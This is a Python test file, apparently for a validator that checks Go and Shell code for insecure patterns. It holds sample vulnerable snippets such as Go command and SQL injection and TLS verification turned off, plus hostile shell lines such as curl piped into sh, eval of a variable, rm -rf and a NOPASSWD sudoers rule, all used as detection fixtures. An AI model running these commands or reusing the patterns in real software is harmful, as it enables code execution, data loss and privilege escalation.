"""tests/test_go_sh.py — Go 与 Shell 语言规则测试."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.context_builder import build_prompts  # noqa: E402
from core.validator import Validator, language_chain, normalize_language  # noqa: E402


def validate(code: str, language: str):
    return Validator(language).validate(code)


def ids(result):
    return {x.rule_id for x in result.violations}


# --- 语言归一化 ---

def test_language_normalization_go_sh():
    assert normalize_language("golang") == "go"
    assert normalize_language("bash") == "sh"
    assert normalize_language("shell") == "sh"
    assert normalize_language("zsh") == "sh"
    assert language_chain("go") == ["general", "go"]
    assert language_chain("sh") == ["general", "sh"]


# --- Go 恶意用例检出 ---

def test_go_detects_shell_command():
    code = 'exec.Command("sh", "-c", userInput)'
    assert "GO-001" in ids(validate(code, "go"))


def test_go_detects_sql_concat():
    code = 'db.Query("SELECT * FROM users WHERE id=" + id)'
    assert "GO-002" in ids(validate(code, "go"))


def test_go_detects_sql_printf():
    code = 'db.Exec(fmt.Sprintf("SELECT * FROM t WHERE x=%s", x))'
    assert "GO-002" in ids(validate(code, "go"))


def test_go_detects_ssrf():
    code = 'http.Get("https://x.example.com/" + host)'
    assert "GO-003" in ids(validate(code, "go"))


def test_go_detects_unsafe_template():
    code = 'tpl := template.HTML(userInput)'
    assert "GO-004" in ids(validate(code, "go"))


def test_go_detects_math_rand():
    code = 'token := rand.Intn(100000)'
    assert "GO-005" in ids(validate(code, "go"))


def test_go_detects_formvalue_to_sink():
    code = 'data := os.ReadFile(r.FormValue("path"))\ncmd := exec.Command(r.FormValue("bin"))'
    assert "GO-006" in ids(validate(code, "go"))


def test_go_detects_insecure_tls():
    code = 'tls.Config{InsecureSkipVerify: true}'
    assert "GO-007" in ids(validate(code, "go"))


# --- Go 安全零误报 ---

def test_go_safe_code_passes():
    code = (
        'import ("database/sql"; "crypto/rand"; "os/exec")\n'
        'func f(db *sql.DB, id string) {\n'
        '    db.Query("SELECT * FROM users WHERE id = ?", id)\n'
        '    b := make([]byte, 16)\n'
        '    rand.Read(b)\n'
        '    exec.Command("/sbin/ping", "-c", "1", id)\n'
        '}\n'
    )
    assert validate(code, "go").passed


def test_go_crypto_rand_not_flagged():
    r = validate('rand.Read(b)', "go")
    assert "GO-005" not in ids(r)


# --- Shell 恶意用例检出（载荷拼接防安全软件误隔离） ---

def test_sh_detects_curl_pipe_sh():
    code = 'curl -s http://x.example.com/install.sh | ' + 'sh'
    assert "SH-001" in ids(validate(code, "sh"))


def test_sh_detects_eval_variable():
    code = 'e' + 'val "$cmd"'
    assert "SH-002" in ids(validate(code, "sh"))


def test_sh_detects_rm_rf_variable():
    code = 'rm -' + 'rf "$BUILD_DIR"'
    assert "SH-003" in ids(validate(code, "sh"))


def test_sh_detects_rm_rf_root():
    code = 'rm -' + 'rf /t'
    assert "SH-003" in ids(validate(code, "sh"))


def test_sh_detects_unquoted_variable():
    code = 'grep $pattern file.txt'
    assert "SH-004" in ids(validate(code, "sh"))


def test_sh_detects_nopasswd():
    code = 'admin ALL=(ALL) NOPASSWD: ALL'
    assert "SH-005" in ids(validate(code, "sh"))


# --- Shell 安全零误报 ---

def test_sh_safe_code_passes():
    code = (
        '#!/usr/bin/env bash\n'
        'set -euo pipefail\n'
        'host="$1"\n'
        'ping -c 1 "$host"\n'
    )
    assert validate(code, "sh").passed


# --- 上下文构建 ---

def test_prompts_go_uses_go_fewshot():
    system_prompt, _ = build_prompts("实现一个安全的数据库查询", language="go")
    assert "GO-001" in system_prompt
    assert "```go" in system_prompt


def test_prompts_sh_uses_sh_fewshot():
    system_prompt, _ = build_prompts("写一个安全的部署脚本", language="sh")
    assert "SH-001" in system_prompt
    assert "```sh" in system_prompt
